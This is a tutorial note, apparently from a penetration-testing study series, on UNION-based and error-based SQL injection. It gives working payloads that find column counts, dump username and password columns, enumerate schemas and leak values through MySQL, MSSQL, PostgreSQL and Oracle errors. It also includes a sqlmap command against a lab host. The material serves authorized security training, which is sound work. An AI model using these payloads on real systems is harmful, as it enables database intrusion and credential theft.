# In-Band SQL Injection — UNION-Based & Error-Based

## 1. In-Band SQL Injection

In-Band SQL Injection occurs when an attacker can retrieve information through the same communication channel used to send the SQL injection payload.

There are two major techniques:

1. **UNION-Based SQLi** — Retrieves database information through the application's normal query output.
2. **Error-Based SQLi** — Retrieves information through database error messages that expose injected data.

The main difference is the data extraction channel:

| Technique | Extraction channel |
|---|---|
| UNION-Based | Normal application response |
| Error-Based | Database error message |

---

# 2. UNION-Based SQLi

## 2.1 Core Mechanism

`UNION` combines the results of two or more SELECT statements into a single result set.

If an application is vulnerable to SQL injection, an attacker may append a second SELECT statement to the original query and retrieve information from other database tables.

Two main requirements must be satisfied:

1. Both SELECT statements must return the same number of columns.
2. Corresponding columns must have compatible data types.

**Important:** The number of columns and data type compatibility are separate requirements. Matching the column count does not automatically guarantee that the UNION query will work.

## 2.2 Step 1 — Determine Column Count

There are two common methods.

### Method A: ORDER BY Increment

Example:

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```

Breakdown:

- `'` — attempts to close the original string literal.
- `ORDER BY N` — sorts the query result using the Nth column.
- If N exceeds the number of available columns, the database may return an error.
- `-- -` — comments out the remaining SQL statement. The extra space makes this syntax compatible with common MySQL comment handling.

**Method:**

Increment the column index until the query produces an error.

The last successful index indicates the number of columns, provided the error is actually caused by an invalid column position.

### Method B: UNION SELECT NULL Increment

Example:

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

Breakdown:

- `UNION SELECT` — attempts to append another SELECT statement.
- `NULL` — acts as a placeholder for an unknown column type.
- Each additional NULL represents another column.
- When the number of columns matches and the query is otherwise valid, the UNION may execute successfully.

**Why NULL?**

NULL is compatible with many SQL data types, making it useful when the original column types are unknown.

However, it does not guarantee compatibility in every SQL context or DBMS.

## 2.3 Step 2 — Identify Reflected Columns

Once the column count is known, identify which columns are displayed in the application's response.

Example (three-column query):

```sql
' UNION SELECT 'a','b','c'-- -
```

Breakdown:

- Replace NULL placeholders with distinguishable marker strings.
- Observe which markers appear in the rendered application response.
- Those positions are the reflected columns.

Example:

| Column | Injected value | Visible? |
|---|---|---|
| 1 | a | No |
| 2 | b | Yes |
| 3 | c | Yes |

In this example, columns 2 and 3 are suitable positions for retrieving information.

**Important:** A column can accept a value without being reflected in the page. Successful UNION execution and visible data reflection are different things.

## 2.4 Step 3 — Extract Data

Example (MySQL, assuming three columns and columns 2 and 3 are reflected):

```sql
' UNION SELECT NULL,username,password FROM users-- -
```

Breakdown:

- `NULL` — placeholder for the first column.
- `username` — retrieves usernames.
- `password` — retrieves password values.
- `FROM users` — specifies the target table.

The values are positioned according to the reflected columns discovered earlier.

**Note:** In a real assessment, database permissions, table names, column names, and output formatting can affect the result.

## 2.5 Step 4 — Enumerating Database Schema

When table or column names are unknown, database metadata can help identify them.

### MySQL / PostgreSQL / MSSQL

**Find table names:**

```sql
SELECT table_name
FROM information_schema.tables;
```

**Find column names:**

```sql
SELECT column_name
FROM information_schema.columns
WHERE table_name='users';
```

Breakdown:

- `information_schema.tables` — metadata view containing information about accessible tables.
- `information_schema.columns` — metadata view containing information about accessible columns.
- `table_name` — identifies the associated table.
- `WHERE table_name='users'` — filters the metadata results to a particular table.

**Important DBMS differences:**

- MySQL metadata can cover multiple databases accessible to the current account. Use `table_schema` to narrow the scope.
- PostgreSQL uses schemas. Use `table_schema` to identify the relevant schema.
- MSSQL uses database-specific metadata. The current database context matters.
- Metadata visibility depends on database permissions.

For example, in MySQL:

```sql
SELECT table_name
FROM information_schema.tables
WHERE table_schema = DATABASE();
```

This restricts the results to the current database.

### Oracle

Oracle uses different metadata views:

| View | Purpose |
|---|---|
| USER_TABLES | Tables owned by the current user |
| ALL_TABLES | Tables accessible to the current user |
| USER_TAB_COLUMNS | Columns in the current user's tables |
| ALL_TAB_COLUMNS | Columns in accessible tables |

Example:

```sql
SELECT table_name FROM all_tables;
```

Find columns:

```sql
SELECT column_name
FROM all_tab_columns
WHERE table_name='USERS';
```

Oracle generally stores unquoted object names in uppercase, so metadata comparisons often use uppercase names.

## 2.6 Step 5 — Multi-Row Extraction

Sometimes the application displays only the first row of a query result.

In that situation, aggregation functions can combine multiple rows into a single string.

### MySQL — GROUP_CONCAT()

Example (three-column context, second column reflected):

```sql
' UNION SELECT NULL,
GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),
NULL FROM users-- -
```

Breakdown:

- `GROUP_CONCAT()` — combines values from multiple rows into one string.
- `username` — retrieves usernames.
- `0x3a` — hexadecimal representation of `:`.
- `password` — retrieves password values.
- `SEPARATOR 0x0a` — separates rows using a newline character.
- `NULL` — placeholders for unused columns.

Example conceptual output:

```text
admin:password123
user1:password456
user2:password789
```

**Important:** MySQL's `group_concat_max_len` setting limits the resulting string length. Large results may be truncated.

### PostgreSQL — STRING_AGG()

Example (two-column context, first column reflected):

```sql
' UNION SELECT
string_agg(username || ':' || password, E'\n'),
NULL
FROM users-- -
```

Breakdown:

- `STRING_AGG()` — combines values from multiple rows into one string.
- `||` — PostgreSQL string concatenation operator.
- `':'` — separates username and password.
- `E'\n'` — represents a newline character using PostgreSQL escape-string syntax.
- `NULL` — placeholder for the second column.

**Important:** The example assumes a two-column original query. Adjust the number and positions of columns to match the actual injection context.

### Function Compatibility

| DBMS | Aggregation function |
|---|---|
| MySQL | GROUP_CONCAT() |
| PostgreSQL | STRING_AGG() |
| MSSQL | STRING_AGG() (SQL Server 2017+) |
| Oracle | LISTAGG() |

---

# 3. Error-Based SQLi

## 3.1 Core Mechanism

Error-Based SQL Injection is used when an application exposes database error messages containing information about the executed SQL operation.

The attacker deliberately triggers an error that may include a database value in its message.

This allows information extraction without requiring the normal UNION result to be reflected.

Typical requirements:

1. A SQL injection vulnerability exists.
2. The database generates an informative error.
3. The application exposes that error to the HTTP response.
4. The selected DBMS technique can place the desired value into the error message.

**Important:** A generic HTTP 500 response does not automatically indicate Error-Based SQLi. The error must provide a usable information channel.

## 3.2 MySQL — EXTRACTVALUE() / UPDATEXML()

These are legacy MySQL error-based techniques.

### EXTRACTVALUE()

Example:

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION())))-- -
```

Breakdown:

- `EXTRACTVALUE(xml_document, xpath_expression)` — evaluates an XPath expression against an XML document.
- `1` — a dummy first argument.
- `CONCAT()` — combines the delimiter and the requested value.
- `0x7e` — hexadecimal representation of `~`.
- `SELECT VERSION()` — retrieves the MySQL server version.

The invalid XPath expression can trigger an error containing the supplied string.

Example conceptual error:

```text
XPATH syntax error: '~8.0.x'
```

The error message becomes the information extraction channel.

### UPDATEXML()

Example:

```sql
' AND UPDATEXML(
1,
CONCAT(0x7e,(SELECT password FROM users LIMIT 1)),
1
)-- -
```

Breakdown:

- `UPDATEXML(target_xml, xpath_expr, new_value)` — updates XML content using an XPath expression.
- The second argument contains the manipulated XPath expression.
- `SELECT password FROM users LIMIT 1` — retrieves one scalar value.
- `LIMIT 1` — restricts the subquery to one row.

If the supplied XPath is invalid, MySQL may include the supplied value in its error message.

**Modern compatibility warning:**

- `EXTRACTVALUE()` and `UPDATEXML()` were deprecated in MySQL 5.7.6.
- Both functions were removed in MySQL 8.0.
- Therefore, these payloads are primarily useful for understanding legacy systems and older MySQL installations.

Do not assume they will work against modern MySQL 8.x applications.

## 3.3 MSSQL — Type Conversion Errors

MSSQL supports type conversion using `CONVERT()` and `CAST()`.

Example:

```sql
SELECT CONVERT(int,'admin123');
```

The conversion fails because `admin123` is not a valid integer.

A database error may reveal the original value.

Example conceptual error:

```text
Conversion failed when converting the varchar value
'admin123' to data type int.
```

An attacker may abuse this behavior to disclose database values through error messages.

Example conceptual injection:

```sql
' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))-- -
```

Breakdown:

- `CONVERT(int, ...)` — attempts to convert the selected value into an integer.
- `SELECT TOP 1 username FROM users` — selects one username.
- If the value cannot be converted, a conversion error may expose it.

**Important:**

- `TOP 1` is MSSQL's row-limiting syntax.
- Error messages and value disclosure vary by SQL Server version, query context, and error handling.
- Do not assume every conversion error exposes the complete original value.

## 3.4 PostgreSQL — Cast Errors

PostgreSQL supports type conversion using `CAST()` and `::`.

Example:

```sql
SELECT CAST('admin' AS int);
```

This produces a conversion error because `admin` cannot be converted into an integer.

A database error may disclose the invalid input value.

Example conceptual injection:

```sql
' AND 1=CAST((SELECT current_user) AS int)-- -
```

Breakdown:

- `CAST(value AS int)` — attempts to convert a value into an integer.
- `SELECT current_user` — retrieves the current database session user.
- If the returned username is not numeric, the cast fails.

Example conceptual error:

```text
invalid input syntax for type integer: "app_user"
```

This can disclose the current database user.

## 3.5 Oracle — XMLType Errors

Oracle provides XML processing functionality through `XMLType`.

Example conceptual technique:

```sql
SELECT XMLTYPE('<invalid XML') FROM dual;
```

This attempts to parse invalid XML and can produce an XML parsing error.

Oracle error-based SQL injection has historically used XML-related functions and parsing errors to expose supplied values.

Useful Oracle components to understand:

- `XMLTYPE()` — constructs an XMLType instance from XML content.
- `CHR()` — converts a numeric character code into a character.
- `V$VERSION` — provides Oracle database version information.
- `ALL_TABLES` — provides metadata about accessible tables.
- `DUAL` — Oracle's built-in one-row dummy table.

**Important:** XMLType-based error extraction is context-dependent. Not every malformed XML expression reflects the original input in the error message. Do not treat one historical XMLType payload as a universal modern Oracle exploit.

---

# 4. Database Fingerprinting

Database fingerprinting helps identify which DBMS is running before choosing a database-specific technique.

Common version queries:

| DBMS | Version query |
|---|---|
| MySQL | `SELECT VERSION()` |
| PostgreSQL | `SELECT version()` |
| MSSQL | `SELECT @@VERSION` |
| Oracle | `SELECT banner FROM v$version` |

Error messages can also provide useful fingerprints.

| DBMS | Common error patterns |
|---|---|
| MySQL | `You have an error in your SQL syntax` |
| PostgreSQL | `syntax error at or near` |
| MSSQL | `Incorrect syntax near` |
| Oracle | `ORA-` error codes |

**Important:** Error messages provide clues, not absolute proof. Applications can suppress, transform, or generate their own errors.

Use multiple indicators when identifying a DBMS.

---

# 5. Real-World Notes

### Common Mistakes

- Assuming a successful UNION column count automatically means the data types are compatible.
- Assuming a query that returns HTTP 200 necessarily executed correctly.
- Forgetting that the reflected column must accept the selected data type.
- Assuming every database supports the same aggregation function.
- Using deprecated MySQL XML functions against MySQL 8.x.
- Assuming every MSSQL conversion error exposes the original value.
- Forgetting that metadata visibility depends on database privileges.

### Engagement Reality

Production applications increasingly suppress raw database errors and return generic responses such as:

```text
500 Internal Server Error
```

When raw database errors are not exposed, Error-Based SQLi may not provide a usable extraction channel.

If UNION-based extraction also cannot retrieve data, investigate blind techniques:

- Boolean-Based Blind SQLi.
- Conditional-Error Blind SQLi.
- Time-Based Blind SQLi.
- Out-of-Band SQLi.

Do not spend excessive time trying legacy error-based payloads when the required DBMS function is unavailable or the application suppresses the error.

### SQLMap Automation

SQLMap can help identify and automate different SQL injection techniques.

Example:

```bash
sqlmap -u "https://authorized-lab.example/item?id=1" \
-p id \
--technique=UE \
--batch
```

Breakdown:

- `-u` — target URL.
- `-p id` — specifies the parameter to test.
- `--technique=UE` — restricts testing to UNION-based and error-based techniques.
- `--batch` — uses default answers to prompts.

**Note:** Automation results should be manually verified. SQLMap may identify a technique that cannot be reliably used for extracting data in the application's actual response context.

### Report-Writing Tip

For UNION-based findings, include:

- The vulnerable parameter.
- The original request.
- The discovered column count.
- The reflected column positions.
- A minimal proof-of-concept demonstrating unauthorized data retrieval.

For Error-Based findings, include:

- The vulnerable parameter.
- The database error observed.
- Evidence that the error originated from database query execution.
- The DBMS fingerprint, if established.
- A minimal demonstration of the information disclosure.

Avoid including unnecessary sensitive database records in the report.

---

# 6. PortSwigger Lab Mapping

Recommended practice order:

### UNION-Based SQLi

1. SQL injection attack, querying the database type and version.
2. SQL injection UNION attack, determining the number of columns returned by the query.
3. SQL injection UNION attack, finding a column containing text.
4. SQL injection UNION attack, retrieving data from other tables.
5. SQL injection UNION attack, retrieving multiple values in a single column.

### Error-Based / Database Error Understanding

1. SQL injection vulnerability allowing login bypass — useful for understanding basic SQL injection, but not specifically an Error-Based SQLi lab.
2. Study DBMS-specific error behavior using the SQL injection cheat sheet.

**Important:** The UNION labs are not automatically Error-Based labs. A lab that exposes a database error is not necessarily designed to teach error-based data extraction.

Official resources:

- https://portswigger.net/web-security/sql-injection
- https://portswigger.net/web-security/sql-injection/cheat-sheet

---

# 7. Key Takeaways

Before attempting In-Band SQLi, understand these concepts:

1. **UNION-Based SQLi:** Retrieve information through the application's normal query output.
2. **Column Enumeration:** Identify the number of columns returned by the original query.
3. **Reflected Columns:** Identify which columns are displayed in the application.
4. **Schema Enumeration:** Use database metadata to discover tables and columns.
5. **Data Aggregation:** Use DBMS-specific functions to combine multiple rows into one result.
6. **Error-Based SQLi:** Use informative database errors as an information extraction channel.
7. **DBMS Fingerprinting:** Identify the database before selecting database-specific syntax.

The goal is not to memorize every payload. The goal is to understand how database queries work, how different DBMS implementations behave, and how to identify the most appropriate SQL injection technique during an authorized penetration test.

## Next File

→ `03-blind-sqli.md` — Boolean-Based and Time-Based Blind SQL Injection.
